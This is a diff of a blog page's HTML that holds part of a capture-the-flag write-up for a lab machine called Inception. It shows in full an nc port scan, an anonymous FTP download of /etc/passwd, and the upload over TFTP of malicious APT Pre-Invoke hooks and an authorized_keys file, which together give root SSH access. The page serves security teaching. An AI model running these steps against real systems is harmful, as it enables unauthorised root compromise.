-</span><span class="go">iface eth0 inet static
-</span><span class="go">    address 192.168.0.10
-</span><span class="go">    netmask 255.255.255.0
-</span><span class="go">    gateway 192.168.0.1
-</span><span class="go">    dns-nameservers 192.168.0.1
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:~# cat /etc/resolv.conf
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> Dynamic resolv.conf<span class="o">(</span>5<span class="o">)</span> file <span class="k">for</span> glibc resolver<span class="o">(</span>3<span class="o">)</span> generated by resolvconf<span class="o">(</span>8<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="gp">#</span>     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+</span></span><span class="line"><span class="cl"><span class="go">nameserver 192.168.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~# arp -a
+</span></span></span><span class="line"><span class="cl"><span class="go">? (192.168.0.1) at fe:ae:a2:b2:88:11 [ether] on eth0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~# ifconfig
+</span></span></span><span class="line"><span class="cl"><span class="go">eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
+</span></span></span><span class="line"><span class="cl"><span class="go">          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
+</span></span></span><span class="line"><span class="cl"><span class="go">          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
+</span></span></span><span class="line"><span class="cl"><span class="go">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span></span></span><span class="line"><span class="cl"><span class="go">          RX packets:858019 errors:0 dropped:0 overruns:0 frame:0
+</span></span></span><span class="line"><span class="cl"><span class="go">          TX packets:583712 errors:0 dropped:0 overruns:0 carrier:0
+</span></span></span><span class="line"><span class="cl"><span class="go">          collisions:0 txqueuelen:1000 
+</span></span></span><span class="line"><span class="cl"><span class="go">          RX bytes:74512993 (74.5 MB)  TX bytes:106431159 (106.4 MB)
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~# cat /etc/network/interfaces
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> This file describes the network interfaces available on your system
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> and how to activate them. For more information, see interfaces<span class="o">(</span>5<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> The loopback network interface
+</span></span><span class="line"><span class="cl"><span class="go">auto lo
+</span></span></span><span class="line"><span class="cl"><span class="go">iface lo inet loopback
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">auto eth0
+</span></span></span><span class="line"><span class="cl"><span class="go">iface eth0 inet static
+</span></span></span><span class="line"><span class="cl"><span class="go">    address 192.168.0.10
+</span></span></span><span class="line"><span class="cl"><span class="go">    netmask 255.255.255.0
+</span></span></span><span class="line"><span class="cl"><span class="go">    gateway 192.168.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go">    dns-nameservers 192.168.0.1
+</span></span></span></code></pre></div></div></p>
 
 <p>Well, it seems we are 192.168.0.10 and our gateway is 192.168.0.1. Let&rsquo;s find what ports are listening on the gateway (Look mom! No need for nmap! :D):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:~# nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded
-</span><span class="go">Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
-</span><span class="go">Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
-</span><span class="go">Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:~# nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded
+</span></span></span><span class="line"><span class="cl"><span class="go">Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
+</span></span></span><span class="line"><span class="cl"><span class="go">Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
+</span></span></span><span class="line"><span class="cl"><span class="go">Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
+</span></span></span></code></pre></div></div></p>
 
 <p>Well, well. Port 21 (i.e. FTP) is open. Let&rsquo;s try it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:/dev/shm# ftp 192.168.0.1
-</span><span class="go">Connected to 192.168.0.1.
-</span><span class="go">220 (vsFTPd 3.0.3)
-</span><span class="go">Name (192.168.0.1:cobb): anonymous
-</span><span class="go">331 Please specify the password.
-</span><span class="go">Password: anonymous
-</span><span class="go">230 Login successful.
-</span><span class="go">Remote system type is UNIX.
-</span><span class="go">Using binary mode to transfer files.
-</span><span class="go">ftp&gt;
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:/dev/shm# ftp 192.168.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go">Connected to 192.168.0.1.
+</span></span></span><span class="line"><span class="cl"><span class="go">220 (vsFTPd 3.0.3)
+</span></span></span><span class="line"><span class="cl"><span class="go">Name (192.168.0.1:cobb): anonymous
+</span></span></span><span class="line"><span class="cl"><span class="go">331 Please specify the password.
+</span></span></span><span class="line"><span class="cl"><span class="go">Password: anonymous
+</span></span></span><span class="line"><span class="cl"><span class="go">230 Login successful.
+</span></span></span><span class="line"><span class="cl"><span class="go">Remote system type is UNIX.
+</span></span></span><span class="line"><span class="cl"><span class="go">Using binary mode to transfer files.
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt;
+</span></span></span></code></pre></div></div></p>
 
 <p>That&rsquo;s it! Now, if we explore a little the gateway, using our FTP access, we are gonna find some intresting things:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">ftp&gt; cd /etc
-</span><span class="go">250 Directory successfully changed.
-</span><span class="go">ftp&gt; get passwd
-</span><span class="go">local: passwd remote: passwd
-</span><span class="go">200 PORT command successful. Consider using PASV.
-</span><span class="go">150 Opening BINARY mode data connection for passwd (1622 bytes).
-</span><span class="go">226 Transfer complete.
-</span><span class="go">1622 bytes received in 0.00 secs (4.0600 MB/s)
-</span><span class="go">ftp&gt; get crontab
-</span><span class="go">local: crontab remote: crontab
-</span><span class="go">200 PORT command successful. Consider using PASV.
-</span><span class="go">150 Opening BINARY mode data connection for crontab (826 bytes).
-</span><span class="go">226 Transfer complete.
-</span><span class="go">826 bytes received in 0.00 secs (2.4464 MB/s)
-</span><span class="go">ftp&gt; cd default
-</span><span class="go">250 Directory successfully changed.
-</span><span class="go">ftp&gt; get tftpd-hpa
-</span><span class="go">local: tftpd-hpa remote: tftpd-hpa
-</span><span class="go">200 PORT command successful. Consider using PASV.
-</span><span class="go">150 Opening BINARY mode data connection for tftpd-hpa (118 bytes).
-</span><span class="go">226 Transfer complete.
-</span><span class="go">118 bytes received in 0.00 secs (281.0594 kB/s)
-</span><span class="go">ftp&gt; exit
-</span><span class="go">221 Goodbye.
-</span><span class="go">root@Inception:~# cat passwd
-</span><span class="go">...
-</span><span class="go">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
-</span><span class="go">ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
-</span><span class="go">tftp:x:112:119:tftp daemon,,,:/var/lib/tftpboot:/bin/false
-</span><span class="go">...
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~# cat tftpd-hpa
-</span><span class="go"></span><span class="gp"># </span>/etc/default/tftpd-hpa
-<span class="err">
-</span><span class="err"></span><span class="go">TFTP_USERNAME=&#34;root&#34;
-</span><span class="go">TFTP_DIRECTORY=&#34;/&#34;
-</span><span class="go">TFTP_ADDRESS=&#34;:69&#34;
-</span><span class="go">TFTP_OPTIONS=&#34;--secure --create&#34;
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~# cat crontab
-</span><span class="go">...
-</span><span class="go"></span><span class="gp"># </span>m h dom mon dow user	<span class="nb">command</span>
-<span class="go">17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
-</span><span class="go">25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
-</span><span class="go">47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
-</span><span class="go">52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
-</span><span class="go">*/5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
-</span><span class="go">30 23	* * *	root	apt upgrade -y 2&gt;&amp;1 &gt;/dev/null
-</span><span class="go">...
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ftp&gt; cd /etc
+</span></span></span><span class="line"><span class="cl"><span class="go">250 Directory successfully changed.
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; get passwd
+</span></span></span><span class="line"><span class="cl"><span class="go">local: passwd remote: passwd
+</span></span></span><span class="line"><span class="cl"><span class="go">200 PORT command successful. Consider using PASV.
+</span></span></span><span class="line"><span class="cl"><span class="go">150 Opening BINARY mode data connection for passwd (1622 bytes).
+</span></span></span><span class="line"><span class="cl"><span class="go">226 Transfer complete.
+</span></span></span><span class="line"><span class="cl"><span class="go">1622 bytes received in 0.00 secs (4.0600 MB/s)
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; get crontab
+</span></span></span><span class="line"><span class="cl"><span class="go">local: crontab remote: crontab
+</span></span></span><span class="line"><span class="cl"><span class="go">200 PORT command successful. Consider using PASV.
+</span></span></span><span class="line"><span class="cl"><span class="go">150 Opening BINARY mode data connection for crontab (826 bytes).
+</span></span></span><span class="line"><span class="cl"><span class="go">226 Transfer complete.
+</span></span></span><span class="line"><span class="cl"><span class="go">826 bytes received in 0.00 secs (2.4464 MB/s)
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; cd default
+</span></span></span><span class="line"><span class="cl"><span class="go">250 Directory successfully changed.
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; get tftpd-hpa
+</span></span></span><span class="line"><span class="cl"><span class="go">local: tftpd-hpa remote: tftpd-hpa
+</span></span></span><span class="line"><span class="cl"><span class="go">200 PORT command successful. Consider using PASV.
+</span></span></span><span class="line"><span class="cl"><span class="go">150 Opening BINARY mode data connection for tftpd-hpa (118 bytes).
+</span></span></span><span class="line"><span class="cl"><span class="go">226 Transfer complete.
+</span></span></span><span class="line"><span class="cl"><span class="go">118 bytes received in 0.00 secs (281.0594 kB/s)
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; exit
+</span></span></span><span class="line"><span class="cl"><span class="go">221 Goodbye.
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:~# cat passwd
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
+</span></span></span><span class="line"><span class="cl"><span class="go">tftp:x:112:119:tftp daemon,,,:/var/lib/tftpboot:/bin/false
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~# cat tftpd-hpa
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> /etc/default/tftpd-hpa
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">TFTP_USERNAME=&#34;root&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">TFTP_DIRECTORY=&#34;/&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">TFTP_ADDRESS=&#34;:69&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go">TFTP_OPTIONS=&#34;--secure --create&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~# cat crontab
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> m h dom mon dow user	<span class="nb">command</span>
+</span></span><span class="line"><span class="cl"><span class="go">17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+</span></span></span><span class="line"><span class="cl"><span class="go">25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+</span></span></span><span class="line"><span class="cl"><span class="go">47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+</span></span></span><span class="line"><span class="cl"><span class="go">52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+</span></span></span><span class="line"><span class="cl"><span class="go">*/5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
+</span></span></span><span class="line"><span class="cl"><span class="go">30 23	* * *	root	apt upgrade -y 2&gt;&amp;1 &gt;/dev/null
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div></p>
 
 <p>We see that we have also TFTP access with writing permissions to create new files (in contrast our FTP access is read only):
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">--create, -c
-      Allow new files to be created.   By  default,  tftpd  will  only
-      allow  upload  of  files  that already exist.  Files are created
-      with default permissions allowing anyone to read or write  them,
-      unless the --permissive or --umask options are specified.</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">--create, -c
+</span></span><span class="line"><span class="cl">      Allow new files to be created.   By  default,  tftpd  will  only
+</span></span><span class="line"><span class="cl">      allow  upload  of  files  that already exist.  Files are created
+</span></span><span class="line"><span class="cl">      with default permissions allowing anyone to read or write  them,
+</span></span><span class="line"><span class="cl">      unless the --permissive or --umask options are specified.</span></span></code></pre></div></p>
 
 <p>We have also a very interesting cron job which is executed every 5 minutes:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
-*/5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
-...</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">*/5 *	* * *	root	apt update 2&gt;&amp;1 &gt;/var/log/apt/custom.log
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div></p>
 
 <h2 id="getting-root-flag">Getting root flag</h2>
 
 <p>Now, read this: <a href="https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/" target="_blank">https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/</a>
 We can add some hooks to run a command or script after running apt-get by adding or editing files inside the /etc/apt/apt.conf.d/ directory:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:/dev/shm# echo &#39;APT::Update::Pre-Invoke {&#34;/bin/cp /root/root.txt /dev/shm/flag; chmod 755 /dev/shm/flag&#34;};&#39; &gt; 100update
-</span><span class="go">root@Inception:/dev/shm# tftp 192.168.0.1
-</span><span class="go">tftp&gt; put 100update /etc/apt/apt.conf.d/100update
-</span><span class="go">Sent 56 bytes in 0.0 seconds
-</span><span class="go">tftp&gt; q
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:/dev/shm# echo &#39;APT::Update::Pre-Invoke {&#34;/bin/cp /root/root.txt /dev/shm/flag; chmod 755 /dev/shm/flag&#34;};&#39; &gt; 100update
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:/dev/shm# tftp 192.168.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go">tftp&gt; put 100update /etc/apt/apt.conf.d/100update
+</span></span></span><span class="line"><span class="cl"><span class="go">Sent 56 bytes in 0.0 seconds
+</span></span></span><span class="line"><span class="cl"><span class="go">tftp&gt; q
+</span></span></span></code></pre></div></div></p>
 
 <p>Now wait a little and the use ftp to read the flag:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:~# ftp 192.168.0.1 
-</span><span class="go">ftp&gt; cd /dev/shm
-</span><span class="go">ftp&gt; get flag
-</span><span class="go">ftp&gt; bye
-</span><span class="go">root@Inception:~# cat root.txt
-</span><span class="go">8d1e2e91de427a6fc1a9dc309d563359
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:~# ftp 192.168.0.1 
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; cd /dev/shm
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; get flag
+</span></span></span><span class="line"><span class="cl"><span class="go">ftp&gt; bye
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:~# cat root.txt
+</span></span></span><span class="line"><span class="cl"><span class="go">8d1e2e91de427a6fc1a9dc309d563359
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="getting-root-shell-on-192-168-0-1-via-ssh">Getting root shell (on 192.168.0.1 via SSH)</h2>
 
 <p>We can create a private/public key pair for our user:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:/home# cd /root/.ssh
-</span><span class="go">root@Inception:~/.ssh# ssh-keygen
-</span><span class="go">Generating public/private rsa key pair.
-</span><span class="go">Enter file in which to save the key (/root/.ssh/id_rsa): 
-</span><span class="go">Enter passphrase (empty for no passphrase): 
-</span><span class="go">Enter same passphrase again: 
-</span><span class="go">Your identification has been saved in /root/.ssh/id_rsa.
-</span><span class="go">Your public key has been saved in /root/.ssh/id_rsa.pub.
-</span><span class="go">The key fingerprint is:
-</span><span class="go">SHA256:o34Av3ZHFt2bC3ZW7A2Q7wlaARTZzXqkeAnf7+w8AcE root@Inception
-</span><span class="go">The key&#39;s randomart image is:
-</span><span class="go">+---[RSA 2048]----+
-</span><span class="go">|         .+=.+   |
-</span><span class="go">|          o =E+  |
-</span><span class="go">|           = @.. |
-</span><span class="go">|    .     o X.* o|
-</span><span class="go">|     o  S  = +.O.|
-</span><span class="go">|      o. .+ o B.+|
-</span><span class="go">|      .o o . + +.|
-</span><span class="go">|     .o o .   .oo|
-</span><span class="go">|     ..o .     .+|
-</span><span class="go">+----[SHA256]-----+
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~/.ssh# ls
-</span><span class="go">id_rsa  id_rsa.pub  known_hosts
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:/home# cd /root/.ssh
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:~/.ssh# ssh-keygen
+</span></span></span><span class="line"><span class="cl"><span class="go">Generating public/private rsa key pair.
+</span></span></span><span class="line"><span class="cl"><span class="go">Enter file in which to save the key (/root/.ssh/id_rsa): 
+</span></span></span><span class="line"><span class="cl"><span class="go">Enter passphrase (empty for no passphrase): 
+</span></span></span><span class="line"><span class="cl"><span class="go">Enter same passphrase again: 
+</span></span></span><span class="line"><span class="cl"><span class="go">Your identification has been saved in /root/.ssh/id_rsa.
+</span></span></span><span class="line"><span class="cl"><span class="go">Your public key has been saved in /root/.ssh/id_rsa.pub.
+</span></span></span><span class="line"><span class="cl"><span class="go">The key fingerprint is:
+</span></span></span><span class="line"><span class="cl"><span class="go">SHA256:o34Av3ZHFt2bC3ZW7A2Q7wlaARTZzXqkeAnf7+w8AcE root@Inception
+</span></span></span><span class="line"><span class="cl"><span class="go">The key&#39;s randomart image is:
+</span></span></span><span class="line"><span class="cl"><span class="go">+---[RSA 2048]----+
+</span></span></span><span class="line"><span class="cl"><span class="go">|         .+=.+   |
+</span></span></span><span class="line"><span class="cl"><span class="go">|          o =E+  |
+</span></span></span><span class="line"><span class="cl"><span class="go">|           = @.. |
+</span></span></span><span class="line"><span class="cl"><span class="go">|    .     o X.* o|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     o  S  = +.O.|
+</span></span></span><span class="line"><span class="cl"><span class="go">|      o. .+ o B.+|
+</span></span></span><span class="line"><span class="cl"><span class="go">|      .o o . + +.|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     .o o .   .oo|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     ..o .     .+|
+</span></span></span><span class="line"><span class="cl"><span class="go">+----[SHA256]-----+
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~/.ssh# ls
+</span></span></span><span class="line"><span class="cl"><span class="go">id_rsa  id_rsa.pub  known_hosts
+</span></span></span></code></pre></div></div></p>
 
 <p>Then we can upload our public key on 192.168.0.1:/id_rsa.pub /root/.ssh/authorized_keys using TFTP. The problem with this approach is that TFTP creates the file with too broad permissions (anyone is allowed to read or write it). SSH public keys fail if authorized_keys has incorrect permissions. But, we can use our previous apt trick to set the correct permissions:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:~/.ssh# echo &#39;APT::Update::Pre-Invoke {&#34;chmod 600 /root/.ssh/authorized_keys&#34;};&#39; &gt; 10update
-</span><span class="go">root@Inception:~/.ssh# tftp 192.168.0.1
-</span><span class="go">tftp&gt; put id_rsa.pub /root/.ssh/authorized_keys
-</span><span class="go">Sent 397 bytes in 0.0 seconds
-</span><span class="go">tftp&gt; put 10update /etc/apt/apt.conf.d/10update
-</span><span class="go">Sent 67 bytes in 0.0 seconds
-</span><span class="go">tftp&gt; q
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:~/.ssh# echo &#39;APT::Update::Pre-Invoke {&#34;chmod 600 /root/.ssh/authorized_keys&#34;};&#39; &gt; 10update
+</span></span></span><span class="line"><span class="cl"><span class="go">root@Inception:~/.ssh# tftp 192.168.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go">tftp&gt; put id_rsa.pub /root/.ssh/authorized_keys
+</span></span></span><span class="line"><span class="cl"><span class="go">Sent 397 bytes in 0.0 seconds
+</span></span></span><span class="line"><span class="cl"><span class="go">tftp&gt; put 10update /etc/apt/apt.conf.d/10update
+</span></span></span><span class="line"><span class="cl"><span class="go">Sent 67 bytes in 0.0 seconds
+</span></span></span><span class="line"><span class="cl"><span class="go">tftp&gt; q
+</span></span></span></code></pre></div></div></p>
 
 <p>Now wait a little and then you can connect to 192.168.0.1 as root via SSH:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">root@Inception:~/.ssh# ssh root@192.168.0.1
-</span><span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go"> * Documentation:  https://help.ubuntu.com
-</span><span class="go"> * Management:     https://landscape.canonical.com
-</span><span class="go"> * Support:        https://ubuntu.com/advantage
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">0 packages can be updated.
-</span><span class="go">0 updates are security updates.
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">root@Inception:~# cat root.txt
-</span><span class="go">8d1e2e91de427a6fc1a9dc309d563359
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">root@Inception:~/.ssh# ssh root@192.168.0.1
+</span></span></span><span class="line"><span class="cl"><span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> * Documentation:  https://help.ubuntu.com
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Management:     https://landscape.canonical.com
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Support:        https://ubuntu.com/advantage
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">0 packages can be updated.
+</span></span></span><span class="line"><span class="cl"><span class="go">0 updates are security updates.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">root@Inception:~# cat root.txt
+</span></span></span><span class="line"><span class="cl"><span class="go">8d1e2e91de427a6fc1a9dc309d563359
+</span></span></span></code></pre></div></div></p>
 
         </div>
 
@@ -731,6 +731,42 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -738,6 +774,62 @@ We can add some hooks to run a command or script after running apt-get by adding
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nl80211/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
+      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Oct 2016</time>
+      <time lang="el">09 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -780,6 +872,106 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
             <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+    <div class="cell">
